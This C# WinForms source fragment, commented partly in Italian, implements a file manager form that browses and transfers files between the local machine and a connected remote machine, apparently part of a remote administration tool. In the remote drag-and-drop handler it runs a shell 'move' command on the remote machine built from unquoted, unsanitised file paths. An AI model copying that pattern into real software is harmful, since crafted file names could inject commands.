                    if (SelectedRow.Index == HitInfo.RowIndex)
                    {
                        IsMouseOnSelectedRow = true;
                    }
                }


                if (HitInfo.RowIndex != -1 && IsMouseOnSelectedRow)
                {
                    var FileActionsMenuLocal = new ContextMenuStrip();

                    FileActionsMenuLocal.ItemClicked += FileActionsMenuLocal_ItemClicked;

                    var DeleteItem = new ToolStripMenuItem("Delete");
                    DeleteItem.Image = Properties.Resources.trashbin;
                    FileActionsMenuLocal.Items.Add(DeleteItem);

                    var UploadItem = new ToolStripMenuItem("Upload");
                    UploadItem.Image = Properties.Resources.file_upload;
                    UploadItem.Enabled = !LongRunningOperationPending;
                    FileActionsMenuLocal.Items.Add(UploadItem);

                    if (IsOnlyOneItemSelected)
                    {
                        var RenameItem = new ToolStripMenuItem("Rename");
                        RenameItem.Image = Properties.Resources.rename_file_or_folder;
                        FileActionsMenuLocal.Items.Add(RenameItem);
                    }


                    var NewFolderItem = new ToolStripMenuItem("New folder");
                    NewFolderItem.Image = Properties.Resources.new_folder;
                    FileActionsMenuLocal.Items.Add(NewFolderItem);

                    FileActionsMenuLocal.Show(MousePosition);
                }




            }
        }

        private async void FrmFileManager_Load(object sender, EventArgs e)
        {
            //RemoteFilesGrid.EnableHeadersVisualStyles = false;
            //RemoteFilesGrid.ColumnHeadersBorderStyle = DataGridViewHeaderBorderStyle.None;
            //RemoteFilesGrid.ColumnHeadersDefaultCellStyle.BackColor = Color.White;
            //RemoteFilesGrid.ColumnHeadersDefaultCellStyle.SelectionForeColor = Color.Black;
            //RemoteFilesGrid.RowHeadersDefaultCellStyle.SelectionBackColor = Color.White;
            //RemoteFilesGrid.RowHeadersDefaultCellStyle.SelectionForeColor = Color.White;
            //RemoteFilesGrid.ColumnHeadersDefaultCellStyle.SelectionBackColor = Color.FromArgb(32, 34, 46);
            //RemoteFilesGrid.ColumnHeadersDefaultCellStyle.SelectionForeColor = Color.White;

            //LocalFilesGrid.EnableHeadersVisualStyles = false;
            //LocalFilesGrid.ColumnHeadersBorderStyle = DataGridViewHeaderBorderStyle.None;
            //LocalFilesGrid.ColumnHeadersDefaultCellStyle.BackColor = Color.White;
            //LocalFilesGrid.ColumnHeadersDefaultCellStyle.SelectionForeColor = Color.Black;
            //LocalFilesGrid.RowHeadersDefaultCellStyle.SelectionBackColor = Color.White;
            //LocalFilesGrid.RowHeadersDefaultCellStyle.SelectionForeColor = Color.Black;
            //LocalFilesGrid.ColumnHeadersDefaultCellStyle.SelectionBackColor = Color.FromArgb(32, 34, 46);
            //LocalFilesGrid.ColumnHeadersDefaultCellStyle.SelectionForeColor = Color.Black;

            await AddContentToLocalGridAsync();
            await RequestDirectoryData(RemoteFilePathTextbox.Text);
        }




        private void RemoteFilesGrid_CellContentDoubleClick(object sender, DataGridViewCellEventArgs e)
        {
            return;
        }

        private void RemoteFilesGrid_SelectionChanged(object sender, EventArgs e)
        {
            foreach (DataGridViewColumn Column in RemoteFilesGrid.Columns)
            {
                Column.Selected = false;
            }

        }

        private async void RemoteFilesUndoIcon_Click(object sender, EventArgs e)
        {
            if (Directory.GetParent(RemoteFilePathTextbox.Text) == null)
            {
                return;
            }

            RemoteFilePathTextbox.Text = Directory.GetParent(RemoteFilePathTextbox.Text).FullName;
            await RequestDirectoryData(RemoteFilePathTextbox.Text);
            RemoteFilePathTextbox.Select(RemoteFilePathTextbox.Text.Length, 0); //cursore in fondo
        }

        private async void RefreshRemoteFilesIcon_Click(object sender, EventArgs e)
        {
            await RequestDirectoryData(RemoteFilePathTextbox.Text);
        }

        private async void localFilesGrid_CellEndEdit(object sender, DataGridViewCellEventArgs e)
        {
            if (IsUserRenamingAnItem.IsRenaming)
            {
                DataGridViewRow ItemRenamed = LocalFilesGrid.Rows[e.RowIndex];
                string NewName = (string)ItemRenamed.Cells[1].Value;

                if (NewName == "" || NewName == null)
                {
                    ItemRenamed.Cells[1].Value = IsUserRenamingAnItem.OriginalName;
                }
                else
                {
                    string CompletePathOldName = Path.Join(LocalFilesTextBox.Text, IsUserRenamingAnItem.OriginalName);
                    string CompletePathNewName = Path.Join(CompletePathOldName.Replace(CompletePathOldName.Split("\\").Last(), ""), NewName);


                    try
                    {
                        if (Directory.Exists(CompletePathOldName))
                        {
                            System.IO.Directory.Move(CompletePathOldName, CompletePathNewName);
                        }
                        else
                        {
                            System.IO.File.Move(CompletePathOldName, CompletePathNewName);
                        }
                    }
                    catch (Exception RenamingException)
                    {
                        await MessageBoxAsync.MessageBoxErrorAsync("Error", RenamingException.Message);
                    }




                }

                ResetLocalGridToStandard();
                //await AddContentToLocalGridAsync();

                IsUserRenamingAnItem = (false, string.Empty);
                return;

            }

            if (e.RowIndex == 0 && IsUserAddingAFolder.IsAdding) //è stata aggiunta una  cartella, la validià del nome deve essere verificata
            {
                DataGridViewRow NewFolderRow = LocalFilesGrid.Rows[e.RowIndex];
                string NewFolderName = (string)NewFolderRow.Cells[1].Value;
                if (NewFolderName == "" || NewFolderName == null)
                {
                    LocalFilesGrid.Rows.Remove(NewFolderRow);
                }
                else
                {
                    try
                    {
                        FileWatcherUnsubscribe(); //disattiva temporaneamente l'updater della griglia in modo che la cartella appena aggiunta rimanga in cima
                        Directory.CreateDirectory(Path.Join(LocalFilesTextBox.Text, NewFolderName));
                        FileWatcherSubscribe();
                    }
                    catch (Exception ex)
                    {
                        await MessageBoxAsync.MessageBoxErrorAsync("Error creating the directory", ex.ToString());
                    }


                }
                IsUserAddingAFolder = (IsAdding: false, NewName: string.Empty);
                ResetLocalGridToStandard();

                return;
            }
        }

        private async void LocalFilesParentDirIcon_Click(object sender, EventArgs e)
        {
            if (Directory.GetParent(LocalFilesTextBox.Text) == null)
            {
                return; //se è gia la root dir
            }

            LocalFilesTextBox.Text = Directory.GetParent(LocalFilesTextBox.Text).FullName;
            await AddContentToLocalGridAsync();
            LocalFilesTextBox.Select(LocalFilesTextBox.Text.Length, 0);
        }

        private async void RemoteFilesystemIcon_Click(object sender, EventArgs e)
        {
            var MountedPartitionsRequest = new MountedPartitionsRequest();
            await _client.CustomStream.SendPacketAsync(MountedPartitionsRequest);

        }

        private void localFilesGrid_DragEnter(object sender, DragEventArgs e)
        {
            e.Effect = DragDropEffects.Copy;
        }

        private async void localFilesGrid_MouseMove(object sender, MouseEventArgs e)
        {



            if ((e.Button & MouseButtons.Left) == MouseButtons.Left)
            {
                // If the mouse moves outside the rectangle, start the drag.
                if (LocaldragBoxFromMouseDown != Rectangle.Empty &&
                    !LocaldragBoxFromMouseDown.Contains(e.X, e.Y))
                {

                    // Proceed with the drag and drop, passing in the list item.                    
                    //var FileToDrag = new File.Open()

                    List<string> files = new List<string>();
                    files.Add(Path.Join(LocalFilesTextBox.Text, (string)LocalFilesGrid.SelectedRows[0].Cells[1].Value));


                    // Formatta l'oggetto come FileDrop
                    var fileDropDataObject = new DataObject(DataFormats.FileDrop, files.ToArray());

                    // Copia l'oggetto negli appunti


                    DragDropEffects dropEffect = LocalFilesGrid.DoDragDrop(fileDropDataObject, DragDropEffects.Move);






                }


            }






        }

        private void localFilesGrid_MouseDown(object sender, MouseEventArgs e)
        {
            LocalrowIndexFromMouseDown = LocalFilesGrid.HitTest(e.X, e.Y).RowIndex;
            if (LocalrowIndexFromMouseDown != -1)
            {
                // Remember the point where the mouse down occurred. 
                // The DragSize indicates the size that the mouse can move 
                // before a drag event should be started.                
                Size dragSize = SystemInformation.DragSize;

                // Create a rectangle using the DragSize, with the mouse position being
                // at the center of the rectangle.
                LocaldragBoxFromMouseDown = new Rectangle(new Point(e.X - (dragSize.Width / 2),
                                                               e.Y - (dragSize.Height / 2)),
                                    dragSize);
            }
            else
                // Reset the rectangle if the mouse is not over an item in the ListBox.
                LocaldragBoxFromMouseDown = Rectangle.Empty;
        }

        private void localFilesGrid_DragOver(object sender, DragEventArgs e)
        {
            e.Effect = DragDropEffects.Move;
            Point clientPoint = LocalFilesGrid.PointToClient(new Point(e.X, e.Y));

            // Ottieni le informazioni sulla posizione del mouse
            int DestinationItemRowIndex = LocalFilesGrid.HitTest(clientPoint.X, clientPoint.Y).RowIndex;

            int FirstDisplayedRowIndex = LocalFilesGrid.FirstDisplayedScrollingRowIndex;
            int LastDisplayedRowIndex = FirstDisplayedRowIndex + LocalFilesGrid.DisplayedRowCount(true);


            if (DestinationItemRowIndex > (LastDisplayedRowIndex - 2))
            {
                LocalFilesGrid.FirstDisplayedScrollingRowIndex += 1;

            }
            if (DestinationItemRowIndex < FirstDisplayedRowIndex + 2 && LocalFilesGrid.FirstDisplayedScrollingRowIndex >= 1)
            {
                LocalFilesGrid.FirstDisplayedScrollingRowIndex -= 1;


            }




        }

        private async void localFilesGrid_DragDrop(object sender, DragEventArgs e)
        {

            // Ottieni le coordinate del mouse rispetto alle coordinate del controllo DataGridView
            Point clientPoint = LocalFilesGrid.PointToClient(new Point(e.X, e.Y));

            // Ottieni l'indice della colonna in base alle coordinate del mouse
            int DestinationItemRowIndex = LocalFilesGrid.HitTest(clientPoint.X, clientPoint.Y).RowIndex;

            if (e.Data.GetDataPresent(DataFormats.FileDrop))
            {
                // è stato trascinato un file dal filesystem locale
                string[] fileDrop = (e.Data.GetData(DataFormats.FileDrop) as string[]);
                foreach (var SingleFile in fileDrop)
                {
                    string Dest = Path.Join(LocalFilesTextBox.Text, SingleFile.Split("\\").Last());
                    if (File.Exists(Dest)) //trascinato in una cartella dalla griglia stessa
                    {

                        if (LocalFilesGrid.Rows[DestinationItemRowIndex].Cells[2].Value == null)
                        {
                            //se è stato trascinato un file dalla griglia alla griglia in una cartella, allora viene copiato dentro
                            //se è stato trascinato un file dalla griglia alla griglia in un file, allora viene ignorato perche non ha senso
                            string LocalDest = Path.Join(LocalFilesTextBox.Text, (string)LocalFilesGrid.Rows[DestinationItemRowIndex].Cells[1].Value, SingleFile.Split("\\").Last());
                            File.Move(SingleFile, LocalDest, true);
                        }



                    }
                    else //trascinato nella griglia da fuori il programma
                    {
                        if (!Directory.Exists(Dest))
                        {
                            File.Copy(SingleFile, Dest);
                        }

                    }
                }
            }

            if (e.Data.GetDataPresent(DataFormats.StringFormat) && !LongRunningOperationPending)
            {

                LongRunningOperationPending = true;
                //è stato trascinato la path del file remoto dall'altra griglia
                bool IsDir = RemoteFilesGrid.Rows[RemoteFilesGrid.SelectedRows[0].Index].Cells[3].Value == null;
                string fileDrop = (e.Data.GetData(DataFormats.StringFormat) as string);
                await _client.RequestFileDownloadAsync(fileDrop, IsDir);
            }



        }

        private async void RemoteFilesGrid_DragDrop(object sender, DragEventArgs e)
        {
            if (e.Data.GetDataPresent(DataFormats.FileDrop) && !LongRunningOperationPending)
            {
                // è stato trascinato un file
                string[] fileDrop = (e.Data.GetData(DataFormats.FileDrop) as string[]);

                try
                {
                    await UploadFilesToClientAsync(fileDrop, _GenericRemoteOperationCancellation.Token);
                }
                catch (OperationCanceledException)
                {
                    await OnLocalOperationCancelled();
                }
            }

            if (e.Data.GetDataPresent(DataFormats.StringFormat))
            {
                // Ottieni le coordinate del mouse rispetto alle coordinate del controllo DataGridView
                Point clientPoint = RemoteFilesGrid.PointToClient(new Point(e.X, e.Y));

                // Ottieni l'indice della colonna in base alle coordinate del mouse
                int DestinationItemRowIndex = RemoteFilesGrid.HitTest(clientPoint.X, clientPoint.Y).RowIndex;
                string fileDrop = (e.Data.GetData(DataFormats.StringFormat) as string);

                if (RemoteFilesGrid.Rows[DestinationItemRowIndex].Cells[2].Value != null) //se la destinazione è un file ritorna (non ha senso)
                {
                    return;
                }

                foreach (DataGridViewRow Row in RemoteFilesGrid.Rows) //se la partenza è una diretory ritorna (non ha senso)
                {
                    if ((string)Row.Cells[1].Value == fileDrop.Split("\\").Last() && Row.Cells[2].Value == null)
                    {
                        return;
                    }
                }


                ExecuteCommandRequest MoveFile = new()
                {
                    Command = $"move {fileDrop} {RemoteFilePathTextbox.Text}\\{RemoteFilesGrid.Rows[DestinationItemRowIndex].Cells[1].Value}\\{fileDrop.Split("\\").Last()}",
                    NotInteractiveOutput = true
                };

                await _client.CustomStream.SendPacketAsync(MoveFile);

            }
        }

        private void RemoteFilesGrid_MouseMove(object sender, MouseEventArgs e)
        {
            if ((e.Button & MouseButtons.Left) == MouseButtons.Left)
            {
                // If the mouse moves outside the rectangle, start the drag.
                if (RemotedragBoxFromMouseDown != Rectangle.Empty &&
                    !RemotedragBoxFromMouseDown.Contains(e.X, e.Y))
                {



                    string RowContent = $"{RemoteFilePathTextbox.Text}\\{RemoteFilesGrid.SelectedRows[0].Cells[1].Value}";
                    var fileDropDataObject = new DataObject(DataFormats.StringFormat, RowContent);
                    // Proceed with the drag and drop, passing in the list item.                    
                    DragDropEffects dropEffect = RemoteFilesGrid.DoDragDrop(
                    fileDropDataObject,
                    DragDropEffects.Move);
                }
            }
        }

        private void RemoteFilesGrid_MouseDown(object sender, MouseEventArgs e)
        {
            RemoterowIndexFromMouseDown = RemoteFilesGrid.HitTest(e.X, e.Y).RowIndex;
            if (RemoterowIndexFromMouseDown != -1)
            {
                // Remember the point where the mouse down occurred. 
                // The DragSize indicates the size that the mouse can move 
                // before a drag event should be started.                
                Size dragSize = SystemInformation.DragSize;

                // Create a rectangle using the DragSize, with the mouse position being
                // at the center of the rectangle.
                RemotedragBoxFromMouseDown = new Rectangle(new Point(e.X - (dragSize.Width / 2),
                                                               e.Y - (dragSize.Height / 2)),
                                    dragSize);
            }
            else
                // Reset the rectangle if the mouse is not over an item in the ListBox.
                RemotedragBoxFromMouseDown = Rectangle.Empty;
        }

        private void RemoteFilesGrid_DragOver(object sender, DragEventArgs e)
        {
            e.Effect = DragDropEffects.Move;
            Point clientPoint = RemoteFilesGrid.PointToClient(new Point(e.X, e.Y));

            // Ottieni le informazioni sulla posizione del mouse
            int DestinationItemRowIndex = RemoteFilesGrid.HitTest(clientPoint.X, clientPoint.Y).RowIndex;

            int FirstDisplayedRowIndex = RemoteFilesGrid.FirstDisplayedScrollingRowIndex;
            int LastDisplayedRowIndex = FirstDisplayedRowIndex + RemoteFilesGrid.DisplayedRowCount(true);


            if (DestinationItemRowIndex > (LastDisplayedRowIndex - 2))
            {
                RemoteFilesGrid.FirstDisplayedScrollingRowIndex += 1;

            }
            if (DestinationItemRowIndex < FirstDisplayedRowIndex + 2 && RemoteFilesGrid.FirstDisplayedScrollingRowIndex >= 1)
            {
                RemoteFilesGrid.FirstDisplayedScrollingRowIndex -= 1;


            }
        }


        private void HardDriveIcon_Click(object sender, EventArgs e)
        {

            DriveInfo[] AllDrives = DriveInfo.GetDrives();
            List<DriveInformation> DriveInfos = new List<DriveInformation>();
            foreach (DriveInfo d in AllDrives)
            {
                DriveInformation dInfo = new DriveInformation();
                dInfo.RootDirectory = d.RootDirectory.Name;
                dInfo.DriveType = d.DriveType;
                DriveInfos.Add(dInfo);

            }
            ContextMenuStrip LocalPartitionsMenu = CreatePartitionsMenu(DriveInfos);
            LocalPartitionsMenu.Show(MousePosition);
            LocalPartitionsMenu.ItemClicked += OnNewLocalPartitionChoosen;

            LocalEmptyFolderLabel.Visible = false;
        }

        private async void OnNewLocalPartitionChoosen(object? sender, ToolStripItemClickedEventArgs e)
        {
            LocalFilesTextBox.Text = e.ClickedItem.Text;
            await AddContentToLocalGridAsync();
        }

        private void LocalFilesTextBox_TextChanged(object sender, EventArgs e)
        {


            string InitialText = LocalFilesTextBox.Text;
            string TextToComplete = InitialText.Split("\\").Last();

            if (InitialText == $"C:\\Users\\{Environment.UserName}" || IsBackspaceLastKeyPressedInLocalTextbox)
            {
                IsBackspaceLastKeyPressedInLocalTextbox = false;
                return; // il form si è appena aperto
            }



            IEnumerable<string> CurrentSubDirs;

            if (InitialText.EndsWith("\\"))
            {
                return;
            }
            char[] charArray = InitialText.ToCharArray();
            Array.Reverse(charArray);
            string ReversedInitial = new string(charArray);

            int i = ReversedInitial.IndexOf("\\");
            string UntilLastSlash = InitialText.Substring(0, InitialText.Length - i - 1); //lo slash non deve essere incluso 

            try
            {
                CurrentSubDirs = Directory.EnumerateDirectories(UntilLastSlash);
            }
            catch
            {
                return; //access denied
            }


            foreach (string subDir in CurrentSubDirs)
            {
                string SubDirName = subDir.Split("\\").Last();
                if (SubDirName.StartsWith(TextToComplete))
                {
                    if (SubDirName == TextToComplete)
                    {
                        return;
                    }

                    string MissingPart = SubDirName.Replace(TextToComplete, "");
                    LocalFilesTextBox.Text += MissingPart;


                    int IndexOfMissingPart = LocalFilesTextBox.Text.LastIndexOf(MissingPart);

                    LocalFilesTextBox.Select(IndexOfMissingPart, MissingPart.Length);



                    return;
                }
            }


        }

        private void LocalFilesTextBox_KeyDown(object sender, KeyEventArgs e)
        {
            if (e.KeyCode == Keys.Back)
            {
                IsBackspaceLastKeyPressedInLocalTextbox = true;
            }
        }

        private async void CancelRemoteOperationIcon_Click(object sender, EventArgs e)
        {
            _GenericRemoteOperationCancellation.Cancel();
            await _client.CustomStream.SendPacketAsync(new CancelRemoteOperationRequest()
            {
                TaskId = TasksIds.CLIENT_DOWNLOAD_TASK_ID
            }); //la richiesta di cancellazione delle operazioni asincrone in corso viene mandata al client

        }

        private void LocalFilesGrid_CellFormatting(object sender, DataGridViewCellFormattingEventArgs e)
        {
            e.CellStyle.ForeColor = Color.White;
        }

        private void LocalFilesGrid_CellPainting(object sender, DataGridViewCellPaintingEventArgs e)
        {

        }

        private void RemoteFilesGrid_CellFormatting(object sender, DataGridViewCellFormattingEventArgs e)
        {
            e.CellStyle.ForeColor = Color.White;
        }



        private void RemoteFilesGrid_CellContentClick_1(object sender, DataGridViewCellEventArgs e)
        {

        }
    }
}

